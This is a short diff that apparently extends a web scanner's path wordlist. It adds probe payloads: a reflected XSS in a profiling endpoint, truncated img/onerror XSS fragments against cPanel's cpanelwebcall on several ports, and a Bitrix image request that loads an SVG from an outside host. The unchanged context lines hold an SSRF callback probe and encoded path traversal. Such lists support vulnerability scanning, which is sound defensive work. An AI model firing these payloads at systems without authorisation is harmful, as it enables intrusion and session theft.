@@ -143,3 +143,9 @@
 /v1/avatars/favicon?url=http://{{interactsh-url}}
 /assets/built%2F..%2F..%2F/package.json
 /assets/built%2F..%2F..%2F%E0%A4%A/package.json
+/web/set_profiling?profile=0&collector=<script>alert(document.domain)</script>
+:2080/cpanelwebcall/<img%20src=x%20onerror=
+:2082/cpanelwebcall/<img%20src=x%20onerror=
+:2083/cpanelwebcall/<img%20src=x%20onerror=
+:2086/cpanelwebcall/<img%20src=x%20onerror=
+/bitrix/tools/imagepg.php?img=//metascan.ru/poc.svg
